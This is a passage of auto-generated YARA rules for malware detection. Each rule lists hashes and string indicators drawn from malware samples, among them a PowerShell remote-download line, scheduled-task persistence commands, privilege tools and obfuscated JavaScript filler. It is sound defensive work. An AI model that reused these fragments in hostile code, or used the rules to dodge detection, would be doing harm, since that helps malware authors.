      $s7 = "$validProductIDs = @(\"blooket\", \"template\", \"pdf\", \"manual\", \"map\", \"form\", \"recipe\")" fullword wide /* score: '11.00'*/
      $s8 = "# bG8gVGVjaG5vbG9naWVzIEluYzEdMBsGA1UEDwwUUHJpdmF0ZSBPcmdhbml6YXRp" fullword wide /* score: '11.00'*/
      $s9 = "$response = $web.DownloadString($url)" fullword wide /* score: '10.00'*/
      $s10 = "AI_SetMsiProperty TEXT_PRODUCT_DESC $json.ProductDescription" fullword wide /* score: '10.00'*/
      $s11 = "AI_SetMsiProperty DOWN_URL $json.DownloadUrl" fullword wide /* score: '10.00'*/
      $s12 = "$flowhelperid = Ai_GetMsiProperty FHN" fullword wide /* score: '9.00'*/
      $s13 = "AI_SetMsiProperty TEXT_PRODUCT_TITLE $json.ProductHeader" fullword wide /* score: '9.00'*/
      $s14 = "AI_SetMsiProperty DialogBitmap $dialogBitmap" fullword wide /* score: '9.00'*/
      $s15 = "# WSvsPyDpLubT42YlETicaUPq0ySk/6Il6ggOKFic6QIDAQABo4IBVTCCAVEwEgYD" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 90KB and
      8 of them
}

rule sig_7ec112b9701c4c5117d2d734412733e29eb4e01edf8f5113db80b84c3703471b_7ec112b9 {
   meta:
      description = "_subset_batch - file 7ec112b9701c4c5117d2d734412733e29eb4e01edf8f5113db80b84c3703471b_7ec112b9.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7ec112b9701c4c5117d2d734412733e29eb4e01edf8f5113db80b84c3703471b"
   strings:
      $s1 = "(2).exe" fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 200KB and
      all of them
}

rule sig_80167c7ae1e8876ddba8a743894aeee73e8a00e9ec36cfe9d3f34b6f7e2e843c_80167c7a {
   meta:
      description = "_subset_batch - file 80167c7ae1e8876ddba8a743894aeee73e8a00e9ec36cfe9d3f34b6f7e2e843c_80167c7a.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "80167c7ae1e8876ddba8a743894aeee73e8a00e9ec36cfe9d3f34b6f7e2e843c"
   strings:
      $s1 = "708e198608b5b463224c3fb77fcf708b845d0c7b5dbc6e9cab9e185c489be089.exe" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _06f595b17685322f38f1e5229d275ffe902c78e906df0a1e67ed9febaf890805_06f595b1_58316cc40bd941e464b03030eedd77843ea56f8b98c0dcd3e_0 {
   meta:
      description = "_subset_batch - from files 06f595b17685322f38f1e5229d275ffe902c78e906df0a1e67ed9febaf890805_06f595b1.exe, 58316cc40bd941e464b03030eedd77843ea56f8b98c0dcd3e4bc462d66a97d0b_58316cc4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "06f595b17685322f38f1e5229d275ffe902c78e906df0a1e67ed9febaf890805"
      hash2 = "58316cc40bd941e464b03030eedd77843ea56f8b98c0dcd3e4bc462d66a97d0b"
   strings:
      $s1 = "x264 - core 164 r3144 5a9dfdd - H.264/MPEG-4 AVC codec - Copyleft 2003-2023 - http://www.videolan.org/x264.html - options: cabac" ascii /* score: '30.00'*/
      $s2 = "http://scripts.sil.org/OFLThis Font Software is licensed under the SIL Open Font License, Version 1.1. This license is available" wide /* score: '25.00'*/
      $s3 = "http://scripts.sil.org/OFLThis Font Software is licensed under the SIL Open Font License, Version 1.1. This license is available" wide /* score: '25.00'*/
      $s4 = "PDFSkills.Belongings.Uninstall.exe" fullword ascii /* score: '22.00'*/
      $s5 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xnpmeta xmlns:x=\"adobe:ns:meta/\" x:xnptk=\"Adobe xnp Core 5.6-c145 79.163499, 2018/08/" ascii /* score: '22.00'*/
      $s6 = "PDFSkillsApp.exe" fullword wide /* score: '22.00'*/
      $s7 = "$action = new-ScheduledTaskAction -Execute $fullPath" fullword ascii /* score: '22.00'*/
      $s8 = "PDFSkills.Belongings.PDFSkillsApp.exe" fullword ascii /* score: '22.00'*/
      $s9 = "PDFSkills.exe" fullword wide /* score: '22.00'*/
      $s10 = "Black ItalicBlackExtraBold ItalicExtraBoldBold ItalicSemiBold ItalicSemiBoldMedium ItalicMediumItalicRegularLight ItalicLightExt" wide /* score: '22.00'*/
      $s11 = "Black ItalicBlackExtraBold ItalicExtraBoldBold ItalicBoldSemiBold ItalicSemiBoldMedium ItalicMediumItalicLight ItalicLightExtraL" wide /* score: '22.00'*/
      $s12 = "targetAppDataFolder" fullword ascii /* score: '21.00'*/
      $s13 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xnpmeta xmlns:x=\"adobe:ns:meta/\" x:xnptk=\"Adobe xnp Core 5.6-c145 79.163499, 2018/08/" ascii /* score: '21.00'*/
      $s14 = "targetAppDataFileFullPath" fullword ascii /* score: '21.00'*/
      $s15 = "CPDFSkillsApp, Version=4.0.0.2, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '21.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f27_1 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash3 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash4 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash5 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash6 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash7 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $x1 = " is not allowed in FIPS 140-only modex509: a root or intermediate certificate is not authorized to sign for this name: refusing " ascii /* score: '62.50'*/
      $x2 = "abbradiogrouparamainavalueaccept-charsetbodyaccesskeygenobrbasefontimeupdateviacacheightmlabelooptgroupatternoembedetailsampictu" ascii /* score: '48.00'*/
      $x3 = "github.com/EDDYCJY/fake-useragent/downloader.(*Download).Get" fullword ascii /* score: '45.00'*/
      $x4 = "x509: failed to parse URI constraint %q: cannot be IP addressexpected attribute selector ([attribute]), found '%c' insteadtls: s" ascii /* score: '39.50'*/
      $x5 = "socks bindProcessingNo Content%s|%s%s|%s/dev/stdinreaddirent (deleted)pidfd_openpidfd_waitexecerrdotnotifyListprofInsertstackLar" ascii /* score: '37.00'*/
      $x6 = "crypto/elliptic: ScalarMult was called on an invalid pointx509: authority key identifier incorrectly marked criticalx509: certif" ascii /* score: '31.00'*/
      $x7 = "github.com/valyala/fasthttp.getCookieKey" fullword ascii /* score: '31.00'*/
      $s8 = "github.com/valyala/fasthttp.(*RequestHeader).ContentType" fullword ascii /* score: '30.00'*/
      $s9 = "github.com/EDDYCJY/fake-useragent.(*browser).load.deferwrap1" fullword ascii /* score: '30.00'*/
      $s10 = "github.com/EDDYCJY/fake-useragent/useragent.(*useragent).SetData" fullword ascii /* score: '30.00'*/
      $s11 = "github.com/EDDYCJY/fake-useragent.(*browser).Random" fullword ascii /* score: '30.00'*/
      $s12 = "github.com/valyala/fasthttp.(*ResponseHeader).SetNoDefaultContentType" fullword ascii /* score: '30.00'*/
      $s13 = "github.com/valyala/fasthttp.(*RequestHeader).realContentLength" fullword ascii /* score: '30.00'*/
      $s14 = "github.com/EDDYCJY/fake-useragent.init" fullword ascii /* score: '30.00'*/
      $s15 = "github.com/valyala/fasthttp.(*ResponseHeader).ContentEncoding" fullword ascii /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _067cada8619c4dea476e8f469f5107f6_imphash__51deaabbd1b3e46567f3a4120ff0174d8fb693a7889760e241d4f38d48a9e091_51deaabb_2 {
   meta:
      description = "_subset_batch - from files 067cada8619c4dea476e8f469f5107f6(imphash).exe, 51deaabbd1b3e46567f3a4120ff0174d8fb693a7889760e241d4f38d48a9e091_51deaabb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ef642dc9261e8de31a6a03f0ddef25af797799bd972da3a0ad4e78b9f2b5139d"
      hash2 = "51deaabbd1b3e46567f3a4120ff0174d8fb693a7889760e241d4f38d48a9e091"
   strings:
      $s1 = "MicrosoftEdgeUpdate.exe" fullword wide /* score: '22.00'*/
      $s2 = "error processing message" fullword ascii /* score: '20.00'*/
      $s3 = "unsupported content encryption algorithm" fullword ascii /* score: '19.00'*/
      $s4 = "loader incomplete" fullword ascii /* score: '18.00'*/
      $s5 = "decoder_process" fullword ascii /* score: '17.00'*/
      $s6 = "log conf missing description" fullword ascii /* score: '17.00'*/
      $s7 = "No supported data to decode. %s%s%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s8 = "dsa_to_EncryptedPrivateKeyInfo_pem_encode" fullword ascii /* score: '15.00'*/
      $s9 = "assertion failed: ((ptr - sh.arena) & ((sh.arena_size >> list) - 1)) == 0" fullword ascii /* score: '15.00'*/
      $s10 = "rsa_to_EncryptedPrivateKeyInfo_pem_encode" fullword ascii /* score: '15.00'*/
      $s11 = "ec_to_EncryptedPrivateKeyInfo_der_encode" fullword ascii /* score: '15.00'*/
      $s12 = "encoder_process" fullword ascii /* score: '15.00'*/
      $s13 = "sm2_to_EncryptedPrivateKeyInfo_pem_encode" fullword ascii /* score: '15.00'*/
      $s14 = "provider=default,fips=no,output=pem,structure=EncryptedPrivateKeyInfo" fullword ascii /* score: '15.00'*/
      $s15 = "dhx_to_EncryptedPrivateKeyInfo_pem_encode" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c_084fbd94693c1a41c17459784e5691d37dee3ab33379097da_3 {
   meta:
      description = "_subset_batch - from files 00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d_00b1ee6c.elf, 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857_37d38427.elf, 3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08_3ad87cc8.elf, 416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7_416aff53.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506_6c5348ed.elf, 6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7_6d5f17d7.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf, 7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02_7de5b038.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "00b1ee6cfc8153ec2db1554076bd3db28102dac4e68901c824083bf4d913315d"
      hash2 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash3 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash4 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash5 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash6 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash7 = "37d3842741544d0ed5833a7b726448a1a51617dbf5e9e2f273022eb2a06b8857"
      hash8 = "3ad87cc8e1672fac36db963bab65fb9d72c255eee04be9a2a4a2b29afb6bff08"
      hash9 = "416aff537cf06107cccfcbff2b142e2f92d23f7aacc51c0e19a66b92b0797fe7"
      hash10 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash11 = "6c5348ed0a55e1c69b6ce05a34879033ae04807f92211eb1fb959b207bb32506"
      hash12 = "6d5f17d7b00a92e39881ac506210c7d6725c92db86942a931e711fb1aede4ce7"
      hash13 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
      hash14 = "7de5b038c5ce3d401bf2c8c38ddf7d71dd3af0018a66fe9bc71a35f912e21c02"
   strings:
      $s1 = "os.(*ProcessState).Sys" fullword ascii /* score: '30.00'*/
      $s2 = "os.(*ProcessState).sys" fullword ascii /* score: '30.00'*/
      $s3 = "os/exec.Command" fullword ascii /* score: '24.00'*/
      $s4 = "os/exec.Command.func1" fullword ascii /* score: '24.00'*/
      $s5 = "on a locked thread with no template threadunexpected signal during runtime execution received but handler not on signal stack" fullword ascii /* score: '21.00'*/
      $s6 = "sync.runtime_SemacquireRWMutex" fullword ascii /* score: '21.00'*/
      $s7 = "sync.runtime_SemacquireRWMutexR" fullword ascii /* score: '21.00'*/
      $s8 = "runtime.waitReason.isMutexWait" fullword ascii /* score: '21.00'*/
      $s9 = "syscall.forkExecPipe" fullword ascii /* score: '21.00'*/
      $s10 = "type:.eq.log.Logger" fullword ascii /* score: '21.00'*/
      $s11 = "processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s12 = "*exec.Cmd" fullword ascii /* score: '20.00'*/
      $s13 = "os/exec.(*Cmd).writerDescriptor.func1" fullword ascii /* score: '20.00'*/
      $s14 = ".attempts int; net.rotate bool; net.unknownOpt bool; net.lookup []string; net.err error; net.mtime time.Time; net.soffset uint32" ascii /* score: '20.00'*/
      $s15 = "*func(*exec.Cmd)" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94_0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e_4 {
   meta:
      description = "_subset_batch - from files 084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba_084fbd94.elf, 0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b_0f50ae3b.elf, 33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c_33a6cb3d.elf, 36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed_36bf2503.elf, 37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d_37c14ac6.elf, 44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48_44c6fbea.elf, 7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c_7b2f554d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "084fbd94693c1a41c17459784e5691d37dee3ab33379097da0f3a06a4ef484ba"
      hash2 = "0f50ae3b7720e4746f66011e6d008da66fe072bdc1d2b436e38425a7b885693b"
      hash3 = "33a6cb3dc7e952f0062b8511a43a445bb85b3535d89edfc11534d9355f82ec2c"
      hash4 = "36bf2503a88c8d7798a0751ff12f0126dd48db205109aa42a2b7129317a627ed"
      hash5 = "37c14ac6942e05caf18340201ab76c17220d446104349ec45cf00a1a67d2376d"
      hash6 = "44c6fbea46ea8d2b1c42d2a77c1af1a64bbc465318ee46edd1322bfe9ee91c48"
      hash7 = "7b2f554ded403a23808d09d27913bdf284a96216ef5b35f1affc6a384d80fb1c"
   strings:
      $x1 = "x509: invalid signature: parent certificate cannot sign this kind of certificatex509: a root or intermediate certificate is not " ascii /* score: '72.50'*/
      $x2 = "stopTheWorld: not stopped (status != _Pgcstop)runtime: name offset base pointer out of rangeruntime: type offset base pointer ou" ascii /* score: '70.50'*/
      $x3 = "span set block with unpopped elements found in resetcasfrom_Gscanstatus: gp->status is not in scan statecrypto/rsa: PSSOptions.S" ascii /* score: '51.50'*/
      $x4 = "/usr/lib/libgdi.so.0.8.2/etc/profile.d/gateway.shhttp2: Request.URI is nilhttp2: Framer %p: read %vframe_data_pad_byte_shortfram" ascii /* score: '38.50'*/
      $x5 = "accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-encoded table f=method ABI and value" ascii /* score: '37.00'*/
      $x6 = " [unexpected CONTINUATION for stream %dbytes.Buffer: truncation out of rangeRoundTrip on uninitialized ClientConntls: unsupporte" ascii /* score: '36.00'*/
      $x7 = "recursive call during initialization - linker skewattempt to execute system stack code on user stackx509: missing ASN.1 contents" ascii /* score: '33.00'*/
      $x8 = "reflect: reflect.Value.Elem on an invalid notinheap pointersync/atomic: store of inconsistently typed value into Valuecrypto/ecd" ascii /* score: '31.00'*/
      $s9 = "os/exec.(*ExitError).Sys" fullword ascii /* score: '30.00'*/
      $s10 = "os/exec.ExitError.Sys" fullword ascii /* score: '30.00'*/
      $s11 = ", locked to threadinvalid character reflect.Value.Uintreflect.Value.Elemreflect.Value.Typereflect: Zero(nil)/etc/pki/tls/certspe" ascii /* score: '26.00'*/
      $s12 = "ProcessingNo ContentRST_STREAMEND_STREAMresumptionres binderres masterexp master12207031256103515625owner diedterminated/setgrou" ascii /* score: '25.00'*/
      $s13 = "onsx509: public key contains large public exponentx509: internal error: IP SAN %x failed to parse (temporarily override with GOD" ascii /* score: '25.00'*/
      $s14 = "unlock: lock countprogToPointerMask: overflow/gc/cycles/forced:gc-cycles/memory/classes/other:bytes/memory/classes/total:bytesfa" ascii /* score: '25.00'*/
      $s15 = "-http-client/1.1Temporary RedirectPermanent RedirectMethod Not AllowedExpectation Failedbad Content-LengthFLOW_CONTROL_ERRORunex" ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _12e12319f1029ec4f8fcbed7e82df162_imphash__12e12319f1029ec4f8fcbed7e82df162_imphash__0017379d_12e12319f1029ec4f8fcbed7e82df1_5 {
   meta:
      description = "_subset_batch - from files 12e12319f1029ec4f8fcbed7e82df162(imphash).exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_0017379d.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_046d6586.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_2d71a195.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_35259e77.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_35371a8b.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_3c803f42.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_42f94e7f.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_43096a97.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_4a2a60db.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_569cd42f.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_590a5762.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_699ac50f.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_6dad743b.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_6e770163.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_8558ed59.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_8927b558.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_8b7fbcd5.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_8c592f31.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_af509914.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_b8501b96.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_bc2e6828.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_c46638e4.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_c56e42be.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_c634df49.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_d03a6c5c.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_d1207466.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_d2c83d38.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_dcd61caf.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_e0ac31bf.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_e57aa74b.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_e819f391.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_ebd32e93.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_f5715dee.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_f571c36f.exe, 12e12319f1029ec4f8fcbed7e82df162(imphash)_ff705dff.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "313721d0454b579811044074714f2891add14ba8d3e1636d040f819f3d2ee44e"
      hash2 = "0017379d4735107d18f0bd0c81bbc5ba929932711779988e9c145ed7dfd14494"
      hash3 = "046d658654aee9cef358ea967f7dd7366b0a4a6bd8fce656b4966ac15362cdb8"
      hash4 = "2d71a1955243bbc9a6d8094f5ff4ba1f537e1cf131b8e055ed424105a284329a"
      hash5 = "35259e77356b2061b3f922f7356d0918dc9eed375f9e963fc29b7aef8f4e0da0"
      hash6 = "35371a8b637e8c7fe70e7114604da35813e5ac097e51e06ef98a5d0fe723fbc4"
      hash7 = "3c803f42a43f8e18e3f275c631fc2325af5486651118cb3f64611e1858469430"
      hash8 = "42f94e7f252061e090533e616803cd01aaa48cb45fed7088a5d00b1ed8e3c2c7"
      hash9 = "43096a97b852d682d2444224f3873748661126f32b1099084ec59ed0e6aadca4"
      hash10 = "4a2a60db619a856a8261eda6cf1a5567919b5c7ba544ee6486040da73d7a77f2"
      hash11 = "569cd42f46b17640024d5d108cc3b9ab683b19c56edcfb39c14302a2aa4fc79b"
      hash12 = "590a5762c7981a574ccad3a8a8f0efa1d23a7913c3c5254133e0de41d08dce5e"
      hash13 = "699ac50fc0b41dcaebe975e9170db737f96af11d8d16a84386a4e57e685d2845"
      hash14 = "6dad743b0a3a2e10a2457bfb2a8812ef8dcacaf5944e3b05ac09f3a860b563b7"
      hash15 = "6e770163d3669b2492f9c5c75c8447271daf53c632284ae89605d006977d8af4"
      hash16 = "8558ed5969d79a175bcee6974983dc7392a916e841cab8e63f6db29ef2b09c96"
      hash17 = "8927b558019b1e68084c7186542a76071232c7f22e95c35b208dda04751503b4"
      hash18 = "8b7fbcd5c94a07a0541a3bed1a3361456da989bcd20d6fa588cebf3e76f379e4"
      hash19 = "8c592f31284b518df20fe7cab026c6c67822c5640f62b586adb9d47ce7968d70"
      hash20 = "af509914fa0370a09e5ea6aca9121eb883c4fd79827de3ac151b67c8290b4c74"
      hash21 = "b8501b965ef855679178b243c2d179e4fbd2d704cf3a51040a19e1321bb6c640"
      hash22 = "bc2e68283d24f8ec3d025f637446ac761e74d2a422f03d97c314705c866f1fc3"
      hash23 = "c46638e4ff2b9755db2fd7bd9c9a97952f4b55cbf82f0d2d806c6c9d4fb7f529"
      hash24 = "c56e42be9ae30d8dd489c6e83f1c285d044b898a7525ead98eb754be66cdd1e9"
      hash25 = "c634df499253c6315784435839263f7bc7cfa29a466f1a1e2cd9d750d8008338"
      hash26 = "d03a6c5cae93998d7cb1fe2339b421c1360b831479c9120f788652123c588ff0"
      hash27 = "d1207466e4c4e2c86e6c81c77a278f156b865e3e830660b1bbb8fb1835619a67"
      hash28 = "d2c83d38e4dc97bec87e67e903b3871fff5c6fb8ea7006b14b62173cb2a2ac94"
      hash29 = "dcd61caf83249f9e296540d93f2b25836022060c387b58f152fa0486e63ffe82"
      hash30 = "e0ac31bf8e8a735061b94e119f8d23282bcbce6bc2c422c446b0705fdb31309f"
      hash31 = "e57aa74bc0ced92e44349941d75ded086be138fce19329770a8730bbf3153b00"
      hash32 = "e819f391ecafd259a6e1a5fedfe4e5533139480910c93a420d3bef62abec7552"
      hash33 = "ebd32e93a4ea41a17dcc3745a7bcd2974c608a6b5ec972ae9da55642164d0fc8"
      hash34 = "f5715dee5028279a948465a8bbf44da4b6f31517ac61e79bd78e85b202be96c8"
      hash35 = "f571c36fa01f936eadec5ef2c1ea5e0a18cdd1c2789f7ceef4be7bb4afdf4df5"
      hash36 = "ff705dffecd20294a7a0cdb5f23a212a7cc39eb538c055e47d53a34f6feebacf"
   strings:
      $x1 = "hater/nircmd.exe" fullword ascii /* score: '36.00'*/
      $s2 = "game.exe" fullword ascii /* score: '22.00'*/
      $s3 = "Cannot create folder %sHChecksum error in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '21.00'*/
      $s4 = "hater/cecho.exe" fullword ascii /* score: '19.00'*/
      $s5 = "hater/7z.exe" fullword ascii /* score: '19.00'*/
      $s6 = "hater/NSudoLG.exe" fullword ascii /* score: '19.00'*/
      $s7 = "CMT;The comment below contains SFX script commands" fullword ascii /* score: '18.00'*/
      $s8 = "233333333333333333" ascii /* score: '17.00'*/ /* hex encoded string '#33333333' */
      $s9 = "$GETPASSWORD1:IDC_PASSWORDENTER" fullword ascii /* score: '17.00'*/
      $s10 = "$GETPASSWORD1:IDOK" fullword ascii /* score: '17.00'*/
      $s11 = "$GETPASSWORD1:SIZE" fullword ascii /* score: '17.00'*/
      $s12 = "&Enter password for the encrypted file:" fullword wide /* score: '17.00'*/
      $s13 = "Unknown encryption method in %s$The specified password is incorrect." fullword wide /* score: '16.00'*/
      $s14 = "Path=%TEMP%" fullword ascii /* score: '15.00'*/
      $s15 = "s:IDS_ERRLNKTARGET" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "12e12319f1029ec4f8fcbed7e82df162" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _24246129e3f3c663996d7495e43f99029b44d2497949dbd9299802fd77cfc3ce_24246129_50caded8522d7f61c4b70e561a5dffea084fa1461812a3e1a_6 {
   meta:
      description = "_subset_batch - from files 24246129e3f3c663996d7495e43f99029b44d2497949dbd9299802fd77cfc3ce_24246129.js, 50caded8522d7f61c4b70e561a5dffea084fa1461812a3e1a5ab9ae61c2d940d_50caded8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "24246129e3f3c663996d7495e43f99029b44d2497949dbd9299802fd77cfc3ce"
      hash2 = "50caded8522d7f61c4b70e561a5dffea084fa1461812a3e1a5ab9ae61c2d940d"
   strings:
      $s1 = "//Plainful markjorders? hysteric fortrdelighedernes: lejrudstyret gearvlgernes: collusive! anmeldende skidding: microcolorimeter" ascii /* score: '27.00'*/
      $s2 = "//Uncompassability; hemmeligstemplet. severy! deleaved! stationsmesteren, samspilsmnstre rovdyrburs helautomatisering laboratori" ascii /* score: '22.00'*/
      $s3 = "strengede filigree gedebukkeskggene? radikalismens udloesemekanismer superelevation skrferskernes? arbejdsgiveres vedhnget duple" ascii /* score: '21.00'*/
      $s4 = "//Bagbordssider135! salambao sponsorial salacity pigpen. cervicolingual? penthouses separationsbevilling, insidious, kiselgur237" ascii /* score: '20.00'*/
      $s5 = "//Adducent, tessaraconter; haartoppene: dunner! buffoarie. exheredate batchkoersler sengetiderne, pollage, publicerer airliners!" ascii /* score: '20.00'*/
      $s6 = "//Gymnospermous. redistricts! bankeaanden sjlstilstandens oceanologi klenavnet, inanimate holds; superillustrated; futtoget! brn" ascii /* score: '20.00'*/
      $s7 = "//Procommemoration flonellograf99! laundromat infiltration139 noninterventionists; bopladsers, smarthederne spermatize: ritchie " ascii /* score: '19.00'*/
      $s8 = "//Officerskorpsets, bhmanden minusets arbejdsstykkernes. dolicholus; destillatets umrket: speedbaades generaldirektren; hellighe" ascii /* score: '19.00'*/
      $s9 = "//Aerodromes fissirostres alvie diskriminerings? gemmology? acylate eightieth, udlgger; mardil balsameret luminescens! ticketmon" ascii /* score: '19.00'*/
